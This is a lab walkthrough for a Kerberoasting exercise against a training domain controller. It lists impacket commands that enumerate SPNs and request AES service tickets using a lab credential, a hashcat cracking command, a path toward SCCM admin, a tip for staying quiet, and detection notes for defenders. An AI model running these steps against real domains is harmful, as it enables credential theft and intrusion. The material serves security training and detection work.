# WT#002 — Kerberoasting (AES)

## Metadata

| Field | Value |
|-------|-------|
| **Target VM** | dc03 (192.168.77.12), range.local |
| **Domain** | range.local |
| **Starting Credential** | analyst_osint / 0S1NT_An@lyst! |
| **Tools Required** | impacket, hashcat |
| **Certifications** | CRTE |
| **MITRE ATT&CK** | T1558.003 |
| **Difficulty** | Easy |

## Prerequisites

- Valid `range.local` domain credentials (`analyst_osint`)
- Network access to dc03 (192.168.77.12)
- `impacket` installed

## Attack Steps

### Step 1: Recon — Enumerate SPNs

```bash
impacket-GetUserSPNs range.local/analyst_osint:'0S1NT_An@lyst!' -dc-ip 192.168.77.12
```

### Step 2: Exploit — Request AES TGS

```bash
impacket-GetUserSPNs range.local/analyst_osint:'0S1NT_An@lyst!' -dc-ip 192.168.77.12 -request -outputfile aes_tgs.txt
```

### Step 3: Verify — Crack the hash

```bash
hashcat -m 19700 aes_tgs.txt /usr/share/wordlists/rockyou.txt --force
```

## Post-Exploitation Chain

AES256 TGS hash (hashcat 19700) → crack → `svc_sccm` plaintext password → SCCM infrastructure access (SCCM Full Administrator on mbr02)

## Telemetry Verification

- **Elastic Index:** `logs-system.security-*`
- **Detection Rule:** Not specifically detected (AES TGS requests are legitimate traffic)
- **Expected Event:** Event ID 4769, ServiceName:HTTP/mbr02.range.local, TicketEncryptionType:0x12 (AES256)
- **Note:** AES Kerberoasting blends in with legitimate Kerberos traffic — no dedicated detection rule exists
- **Defender view:** the tell isn't the encryption type, it's *one account requesting TGS for many SPNs* in a short window — pivot on `event.code:4769` grouped by `Account_Name`. Zeek `kerberos.log` shows the same fan-out.

**Alternative paths:** request a single SPN (`-request-user svc_mssql`) to stay quiet; or roast cross-forest against range.local (WT#033).

## Status

CONFIGURED
